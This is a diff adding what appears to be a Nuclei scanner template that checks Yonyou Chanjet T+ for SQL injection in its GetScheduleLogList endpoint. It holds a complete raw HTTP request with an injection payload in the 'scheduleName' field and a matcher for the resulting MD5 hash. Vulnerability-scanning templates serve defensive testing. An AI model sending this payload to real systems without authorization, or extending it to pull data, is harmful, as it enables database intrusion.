@@ -1,0 +1,27 @@
+id: yongyoutplus-GetScheduleLogList-sqli
+
+info:
+  name: yongyoutplus-GetScheduleLogList-sqli
+  author: xiaokp7
+  severity: critical
+  description: 用友畅捷通TPlus GetScheduleLogList存在SQL注入漏洞
+
+http:
+  - raw:
+    - |
+      POST /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Connection: close
+      Content-Length: 93
+      
+      {"scheduleName":"' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1"}
+
+    matchers:
+       - type: dsl
+         condition: and
+         dsl:
+           - 'status_code==200 || status_code==500'
+           - 'contains_all(body,"0x06d49632c9dc9bcb62aeaef99612ba6b")'
